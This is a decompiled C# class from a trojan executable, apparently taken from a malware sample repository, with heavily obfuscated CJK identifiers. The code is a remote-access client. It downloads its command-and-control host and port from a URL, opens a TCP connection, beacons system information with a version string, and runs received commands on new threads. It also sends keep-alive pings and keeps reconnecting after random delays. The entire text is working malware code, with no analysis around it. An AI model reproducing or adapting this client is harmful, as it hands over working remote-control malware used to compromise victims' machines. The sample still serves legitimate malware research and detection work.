// Decompiled with JetBrains decompiler
// Type: 的法公管的澤尊.人司的敬是將生執顧
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using 成官執望是導;
using 成為的合接城接人管;
using 繼承澤顧澤的官生顧城將人;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 的法公管的澤尊
{
  public class 人司的敬是將生執顧
  {
    public static string 她顧人執顧的的顧引 = 管導行官玉.子望官席公司人太成導;
    public static string 承合生子子的家首希管城的是 = 管導行官玉.她尊玉司合命希的顧法人;
    public static TcpClient 玉的尊子管澤繼導;
    public static Random 人命的太承金成 = new Random();
    public static Thread 引受程成行執導玉 = new Thread(new ThreadStart(人司的敬是將生執顧.她澤使的使席城));
    public static bool 金席人合太太家接合希商合 = false;
    public static MemoryStream 公程是玉顧法顧澤執導合的子城 = (MemoryStream) null;
    public static System.Threading.Timer 繼官導首的 = (System.Threading.Timer) null;
    public static int 公成人接接她城繼程商顧司繼 = 0;
    public static List<int> 顧玉法使商席司 = new List<int>();
    public static bool 玉城顧為的人導 = false;
    public static bool 公敬繼澤顧玉顧商家 = false;
    public static int 商顧城成太接的受 = 0;
    public static int 太玉的執合 = 0;

    public static void 她澤使的使席城()
    {
label_0:
      try
      {
        Thread.Sleep(1);
        checked { ++人司的敬是將生執顧.公成人接接她城繼程商顧司繼; }
        if (人司的敬是將生執顧.公成人接接她城繼程商顧司繼 == 200)
        {
          人司的敬是將生執顧.公成人接接她城繼程商顧司繼 = 0;
          if (人司的敬是將生執顧.玉的尊子管澤繼導.Client.Poll(-1, SelectMode.SelectRead))
          {
            if (人司的敬是將生執顧.玉的尊子管澤繼導.Available == 0)
              goto label_14;
          }
          if (!人司的敬是將生執顧.玉的尊子管澤繼導.Connected)
            goto label_14;
        }
        if (人司的敬是將生執顧.玉的尊子管澤繼導.Available > 0)
        {
          byte[] buffer = new byte[checked (人司的敬是將生執顧.玉的尊子管澤繼導.Available - 1 + 1)];
          人司的敬是將生執顧.玉的尊子管澤繼導.Client.Receive(buffer, 0, buffer.Length, SocketFlags.None);
          人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.Write(buffer, 0, buffer.Length);
          while (true)
          {
            if (命澤成的敬太.澤成將希商使金成是承的承成(人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.ToArray()).Contains(人司的敬是將生執顧.她顧人執顧的的顧引))
            {
              Array Instance = 命澤成的敬太.的引澤尊法官顧人敬子的命生太(人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.ToArray(), 人司的敬是將生執顧.她顧人執顧的的顧引);
              ParameterizedThreadStart start;
              // ISSUE: reference to a compiler-generated field
              if (人司的敬是將生執顧._Closure\u0024__.\u0024IR12\u002D1 != null)
              {
                // ISSUE: reference to a compiler-generated field
                start = 人司的敬是將生執顧._Closure\u0024__.\u0024IR12\u002D1;
              }
              else
              {
                // ISSUE: reference to a compiler-generated field
                人司的敬是將生執顧._Closure\u0024__.\u0024IR12\u002D1 = start = (ParameterizedThreadStart) (a0 => 首成將人的法受合的望的.受商的顧太使使((byte[]) a0));
              }
              new Thread(start).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object) Instance, new object[1]
              {
                (object) 0
              }, (string[]) null)));
              人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.Dispose();
              人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城 = new MemoryStream();
              if (Instance.Length == 2)
                人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.Write((byte[]) NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object) Instance, new object[1]
                {
                  (object) 1
                }, (string[]) null), (Type) null, "length", new object[0], (string[]) null, (Type[]) null, (bool[]) null)));
              else
                goto label_0;
            }
            else
              goto label_0;
          }
        }
        else
          goto label_0;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_14:
      人司的敬是將生執顧.金席人合太太家接合希商合 = false;
      while (!人司的敬是將生執顧.金席人合太太家接合希商合)
      {
        Thread.Sleep(人司的敬是將生執顧.人命的太承金成.Next(5000));
        人司的敬是將生執顧.成將將成引();
      }
      人司的敬是將生執顧.她澤使的使席城();
    }

    public static object 成將將成引()
    {
      人司的敬是將生執顧.金席人合太太家接合希商合 = false;
      try
      {
        人司的敬是將生執顧.玉的尊子管澤繼導.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        人司的敬是將生執顧.繼官導首的.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      object 金席人合太太家接合希商合;
      try
      {
        人司的敬是將生執顧.玉的尊子管澤繼導 = new TcpClient();
        人司的敬是將生執顧.玉的尊子管澤繼導.ReceiveBufferSize = 5120000;
        人司的敬是將生執顧.玉的尊子管澤繼導.SendBufferSize = 5120000;
        人司的敬是將生執顧.玉的尊子管澤繼導.ReceiveTimeout = -1;
        人司的敬是將生執顧.玉的尊子管澤繼導.SendTimeout = -1;
        using (WebClient Instance = new WebClient())
        {
          try
          {
            NetworkCredential networkCredential = new NetworkCredential("", "");
            Instance.Credentials = (ICredentials) networkCredential;
            string[] strArray = Strings.Split(Conversions.ToString(NewLateBinding.LateGet((object) Instance, (Type) null, "DownloadString", new object[1]
            {
              她顧使金太.人商顧的將(管導行官玉.她是合顧玉接首管管是)
            }, (string[]) null, (Type[]) null, (bool[]) null)), ":");
            管導行官玉.太官敬司席金家司為命的 = strArray[0];
            Random random = new Random();
            管導行官玉.顧承商澤命尊承孫望管 = Conversions.ToInteger(strArray[new Random().Next(1, strArray.Length)]);
            Instance.Dispose();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        人司的敬是將生執顧.玉的尊子管澤繼導.Connect(管導行官玉.太官敬司席金家司為命的, 管導行官玉.顧承商澤命尊承孫望管);
        人司的敬是將生執顧.金席人合太太家接合希商合 = true;
        人司的敬是將生執顧.公程是玉顧法顧澤執導合的子城 = new MemoryStream();
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("info" + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.將太將金法司子的() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.首導顧引為玉孫成太接家成繼金() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + "v0.1.9.2" + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.導是望管澤生() + " " + 的公的人官導官太命程.孫商席使的() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.的太的行為為公() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.執的公尊子席() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.孫是望承太城司家() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.公為人管尊首導商引() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.命玉席受人顧城顧家() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + (object) 管導行官玉.顧承商澤命尊承孫望管 + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.太生敬顧太金行家() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + "..." + 人司的敬是將生執顧.承合生子子的家首希管城的是 + " " + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 的公的人官導官太命程.成顧家的的的受澤().ToString() + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 管導行官玉.是敬澤合為的法管金承接生人);
        TimerCallback callback;
        // ISSUE: reference to a compiler-generated field
        if (人司的敬是將生執顧._Closure\u0024__.\u0024IR13\u002D2 != null)
        {
          // ISSUE: reference to a compiler-generated field
          callback = 人司的敬是將生執顧._Closure\u0024__.\u0024IR13\u002D2;
        }
        else
        {
          // ISSUE: reference to a compiler-generated field
          人司的敬是將生執顧._Closure\u0024__.\u0024IR13\u002D2 = callback = (TimerCallback) (a0 => 人司的敬是將生執顧.成顧首人尊顧人首的成敬());
        }
        人司的敬是將生執顧.繼官導首的 = new System.Threading.Timer(callback, (object) null, 0, 1);
        金席人合太太家接合希商合 = (object) 人司的敬是將生執顧.金席人合太太家接合希商合;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        金席人合太太家接合希商合 = (object) 人司的敬是將生執顧.金席人合太太家接合希商合;
        ProjectData.ClearProjectError();
      }
      return 金席人合太太家接合希商合;
    }

    public static void 接席的司成澤她(byte[] 人成的執太)
    {
      MemoryStream memoryStream = new MemoryStream();
      try
      {
        memoryStream.Write(人成的執太, 0, 人成的執太.Length);
        memoryStream.Write(命澤成的敬太.公顧的的澤(人司的敬是將生執顧.她顧人執顧的的顧引), 0, 人司的敬是將生執顧.她顧人執顧的的顧引.Length);
        lock ((object) 人司的敬是將生執顧.玉的尊子管澤繼導)
        {
          人司的敬是將生執顧.玉的尊子管澤繼導.Client.Poll(-1, SelectMode.SelectWrite);
          人司的敬是將生執顧.玉的尊子管澤繼導.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
        memoryStream.Dispose();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        人司的敬是將生執顧.金席人合太太家接合希商合 = false;
        ProjectData.ClearProjectError();
      }
    }

    public static void 孫人顧導程受的生澤顧她首商席(string 澤繼命敬公將顧引孫司) => 人司的敬是將生執顧.接席的司成澤她(命澤成的敬太.公顧的的澤(Conversions.ToString(她顧使金太.城澤生的的席的(澤繼命敬公將顧引孫司))));

    public static void 成顧首人尊顧人首的成敬()
    {
      try
      {
        if (人司的敬是將生執顧.公敬繼澤顧玉顧商家)
          checked { ++人司的敬是將生執顧.商顧城成太接的受; }
        if (人司的敬是將生執顧.玉城顧為的人導)
        {
          人司的敬是將生執顧.公敬繼澤顧玉顧商家 = false;
          人司的敬是將生執顧.玉城顧為的人導 = false;
          人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("!P" + 人司的敬是將生執顧.承合生子子的家首希管城的是 + 人司的敬是將生執顧.商顧城成太接的受.ToString());
          人司的敬是將生執顧.商顧城成太接的受 = 0;
        }
        checked { ++人司的敬是將生執顧.太玉的執合; }
        if (人司的敬是將生執顧.太玉的執合 <= 5000)
          return;
        人司的敬是將生執顧.太玉的執合 = 0;
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("KA");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
